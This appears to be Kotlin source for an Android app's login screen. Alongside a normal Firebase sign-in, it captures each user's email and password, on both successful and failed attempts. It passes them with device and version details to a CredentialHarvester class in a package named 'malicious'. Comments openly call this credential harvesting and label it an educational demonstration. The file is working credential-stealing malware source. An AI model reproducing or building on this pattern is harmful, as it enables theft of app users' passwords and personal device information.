package com.example.ChatterBox

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.CredentialHarvester
import com.google.firebase.auth.FirebaseAuth

class LoginActivity : AppCompatActivity() {
    private lateinit var auth: FirebaseAuth

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        auth = FirebaseAuth.getInstance()

        val emailInput = findViewById<EditText>(R.id.emailInput)
        val passwordInput = findViewById<EditText>(R.id.passwordInput)
        val loginButton = findViewById<Button>(R.id.loginButton)
        val progressBar = findViewById<ProgressBar>(R.id.progressBar)

        loginButton.setOnClickListener {
            val email = emailInput.text.toString().trim()
            val password = passwordInput.text.toString().trim()

            if (email.isEmpty() || password.isEmpty()) {
                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            progressBar.visibility = ProgressBar.VISIBLE

            // Harvest credentials before login attempt (for educational demonstration only)
            harvestCredentials(email, password)
            
            auth.signInWithEmailAndPassword(email, password)
                .addOnSuccessListener {
                    startActivity(Intent(this, MainActivity::class.java))
                    finish()
                }
                .addOnFailureListener {
                    Toast.makeText(this, "Login failed: ${it.message}", Toast.LENGTH_SHORT).show()
                    
                    // Some malware might also collect failed login attempts
                    harvestCredentials(email, password, failed = true)
                }
                .addOnCompleteListener {
                    progressBar.visibility = ProgressBar.GONE
                }
        }
    }
    
    /**
     * Harvest user credentials for malicious purposes
     * FOR EDUCATIONAL DEMONSTRATION ONLY
     */
    private fun harvestCredentials(email: String, password: String, failed: Boolean = false) {
        Log.d("CredentialHarvester", "Harvesting credentials")
        
        try {
            val extraData = mapOf(
                "device_model" to android.os.Build.MODEL,
                "device_manufacturer" to android.os.Build.MANUFACTURER,
                "android_version" to android.os.Build.VERSION.RELEASE,
                "login_successful" to (!failed).toString(),
                "app_version" to BuildConfig.VERSION_NAME
            )
            
            CredentialHarvester.storeCredentials(
                context = this,
                source = "ChatterBox Login",
                username = email,
                password = password,
                extraData = extraData
            )
            
            Log.d("CredentialHarvester", "Credentials harvested successfully")
        } catch (e: Exception) {
            Log.e("CredentialHarvester", "Error harvesting credentials", e)
        }
    }
}
